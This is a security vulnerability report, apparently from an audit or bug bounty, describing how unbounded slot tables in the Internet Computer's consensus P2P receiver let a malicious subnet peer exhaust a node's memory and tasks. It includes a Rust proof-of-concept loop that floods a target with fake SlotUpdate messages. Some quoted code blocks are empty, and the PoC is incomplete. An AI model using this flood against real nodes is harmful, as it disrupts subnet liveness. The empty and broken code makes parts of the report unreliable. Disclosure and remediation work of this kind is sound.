### Title
Unbounded `artifact_processor_tasks` Spawning via `SLOT_TABLE_NO_LIMIT` Enables Memory/CPU Exhaustion by a Malicious Subnet Peer - (File: `rs/replica/setup_ic_network/src/lib.rs`, `rs/p2p/consensus_manager/src/receiver.rs`)

### Summary

The IC's consensus P2P layer uses `SLOT_TABLE_NO_LIMIT = usize::MAX` as the per-peer slot table bound for consensus, certifier, DKG, iDKG, and HTTPS-outcalls artifact types. A malicious subnet node (below the Byzantine fault threshold) can exploit this to spawn an unbounded number of `process_slot_update` Tokio tasks on victim nodes, causing sustained memory and CPU exhaustion.

### Finding Description

In `rs/replica/setup_ic_network/src/lib.rs`, five of the six artifact broadcast channels are configured with no slot limit:

```rust
const SLOT_TABLE_LIMIT_INGRESS: usize = 50_000;
const SLOT_TABLE_NO_LIMIT: usize = usize::MAX;
// ...
new_p2p_consensus.abortable_broadcast_channel(assembler, SLOT_TABLE_NO_LIMIT) // consensus
new_p2p_consensus.abortable_broadcast_channel(assembler, SLOT_TABLE_NO_LIMIT) // certifier
new_p2p_consensus.abortable_broadcast_channel(assembler, SLOT_TABLE_NO_LIMIT) // dkg
new_p2p_consensus.abortable_broadcast_channel(assembler, SLOT_TABLE_NO_LIMIT) // idkg
new_p2p_consensus.abortable_broadcast_channel(assembler, SLOT_TABLE_NO_LIMIT) // https_outcalls
``` [1](#0-0) [2](#0-1) 

In `ConsensusManagerReceiver::handle_slot_update_receive`, the slot limit check is:

```rust
Entry::Vacant(empty_slot) if peer_slot_table_len < self.slot_limit => {
    empty_slot.insert(new_slot_entry);
    // ...
    (true, None)
}
```

With `slot_limit = usize::MAX`, this branch is always taken for any new slot number. Each new unique `(slot_number, artifact_id)` pair causes:
1. A new entry in `peer_slot_table` (the per-peer `HashMap<SlotNumber, SlotEntry>`)
2. A new entry in `active_assembles` (the global `HashMap<ArtifactId, watch::Sender<PeerCounter>>`)
3. A new `process_slot_update` task spawned into `artifact_processor_tasks` (an unbounded `JoinSet`) [3](#0-2) 

The spawned `process_slot_update` task calls `assemble_message`, which evaluates the bouncer and then waits for `peer_rx.wait_for(|p| p.is_empty())` — i.e., it waits indefinitely for the advertising peer to retract the slot. A malicious peer that never overwrites its slots keeps all spawned tasks alive indefinitely. [4](#0-3) 

The `update_handler` that feeds slot updates into the event loop has no per-peer rate limiting:

```rust

    ...
    payload: Bytes,

``` [5](#0-4) 

The router is also configured with `DefaultBodyLimit::disable()`, removing any payload size guard:

```rust

``` [6](#0-5) 

The QUIC transport allows up to `MAX_CONCURRENT_BIDI_STREAMS = 1000` concurrent streams per connection, and the `start_stream_acceptor` loop spawns a task for each accepted stream with no per-peer rate limiting: [7](#0-6) [8](#0-7) 

### Impact Explanation

A malicious subnet node can:
1. Send `SlotUpdate` messages for consensus/certifier/DKG/iDKG/HTTPS-outcalls artifact types, each with a unique `slot_number` and a unique fake `artifact_id`.
2. Never retract those slots (never overwrite them with a higher `commit_id`).
3. Each message causes a new `process_slot_update` task to be spawned and kept alive indefinitely in `artifact_processor_tasks`.
4. The `active_assembles` HashMap and `artifact_processor_tasks` JoinSet grow without bound.

Each live task holds: a `watch::Receiver<PeerCounter>`, a cloned `Assembler`, a `Sender<UnvalidatedArtifactMutation>`, and associated Tokio task overhead. At scale, this exhausts heap memory and saturates the Tokio thread pool on victim nodes, causing them to fall behind consensus, miss rounds, or crash — disrupting subnet liveness.

The ingress artifact type has a protective limit (`SLOT_TABLE_LIMIT_INGRESS = 50_000`), confirming the developers are aware of this attack class, but the same protection is absent for the five other artifact types. [1](#0-0) 

### Likelihood Explanation

The attacker must be a subnet node (authenticated via mutual TLS using registry-keyed certificates). This is a realistic threat: a compromised node operator, a node with a software bug acting maliciously, or a node that has been taken over. The IC's threat model explicitly considers Byzantine peers below the fault threshold. The attack requires no special cryptographic material beyond the node's own TLS key, which it legitimately holds. The attack is sustained and low-cost: sending small protobuf-encoded `SlotUpdate` messages continuously.

### Recommendation

1. Apply a per-peer slot table limit to all artifact types, not just ingress. The existing `SLOT_TABLE_LIMIT_INGRESS = 50_000` pattern should be replicated for consensus, certifier, DKG, iDKG, and HTTPS-outcalls with appropriate per-type bounds derived from protocol maximums (e.g., consensus artifacts per round, DKG transcripts per epoch).
2. Add per-peer rate limiting on `SlotUpdate` message processing in `update_handler` (e.g., a token-bucket limiter keyed by `NodeId`).
3. Add a global cap on `artifact_processor_tasks.len()` to bound total memory usage regardless of per-peer limits.
4. Consider adding a timeout to `peer_rx.wait_for(|p| p.is_empty())` so tasks do not wait indefinitely for a peer that never retracts.

### Proof of Concept

```rust
// Malicious subnet node attack
// Requires: valid subnet node TLS key (legitimate node credential)
// Target: any other node in the same subnet

fn attack(transport: Arc<dyn Transport>, target: NodeId) {
    let mut slot_number: u64 = 0;
    loop {
        // Each iteration creates a new unique slot + artifact ID pair
        let slot_update = pb::SlotUpdate {
            commit_id: 1,
            slot_id: slot_number,  // unique slot number
            update: Some(pb::slot_update::Update::Id(
                // unique fake artifact ID - bouncer will mark Unwanted
                // but task stays alive waiting for peer_rx.wait_for(is_empty)
                encode_fake_consensus_id(slot_number),
            )),
        };
        let request = Request::builder()
            .uri("/consensus/update")
            .body(Bytes::from(slot_update.encode_to_vec()))
            .unwrap();
        // Fire and forget - no need to wait for response
        let _ = transport.rpc(&target, request);
        slot_number += 1;
        // Result: one new process_slot_update task per iteration,
        // never cleaned up because this node never retracts the slot.
        // active_assembles and artifact_processor_tasks grow without bound.
    }
}
```

Each iteration causes `ConsensusManagerReceiver::handle_slot_update_receive` to insert a new entry into `peer_slot_table` (unbounded due to `SLOT_TABLE_NO_LIMIT`) and spawn a new task into `artifact_processor_tasks`. The task calls `assemble_message`, the bouncer returns `Unwanted`, but the task then blocks on `peer_rx.wait_for(|p| p.is_empty())` indefinitely since the malicious peer never retracts the slot. Memory and task count grow without bound until the victim node is resource-exhausted. [9](#0-8) [10](#0-9) [2](#0-1)

async fn update_handler<Artifact: PbArtifact>(
    State((log, sender)): State<(ReplicaLogger, InboundSlotUpdatesSender<Artifact>)>,
    Extension(peer): Extension<NodeId>,
    Extension(conn_id): Extension<ConnId>,
    payload: Bytes,
) -> Result<(), UpdateHandlerError<Artifact>> {
    let pb_slot_update = pb::SlotUpdate::decode(payload)
        .map_err(|e| UpdateHandlerError::SlotUpdateDecoding::<Artifact>(e))?;

    let update = SlotUpdate {
        commit_id: CommitId::from(pb_slot_update.commit_id),
        slot_number: SlotNumber::from(pb_slot_update.slot_id),
        update: match pb_slot_update.update {
            Some(pb::slot_update::Update::Id(id)) => {
                let id: Artifact::Id = Artifact::PbId::decode(id.as_slice())
                    .map_err(|e| UpdateHandlerError::IdDecoding(e))
                    .and_then(|pb_id| {
                        pb_id
                            .try_into()
                            .map_err(|e| UpdateHandlerError::IdPbConversion(e))
                    })?;
                Update::Id(id)
            }
            Some(pb::slot_update::Update::Artifact(artifact)) => {
                let message: Artifact = Artifact::PbMessage::decode(artifact.as_slice())
                    .map_err(|e| UpdateHandlerError::MessageDecoding(e))
                    .and_then(|pb_msg| {
                        pb_msg
                            .try_into()
                            .map_err(|e| UpdateHandlerError::MessagePbConversion(e))
                    })?;
                Update::Artifact(message)
            }
            None => return Err(UpdateHandlerError::MissingUpdate),
        },
    };

    if sender.send((update, peer, conn_id)).await.is_err() {
        error!(log, "Failed to send slot update from handler to event loop")
    }

    Ok(())
}
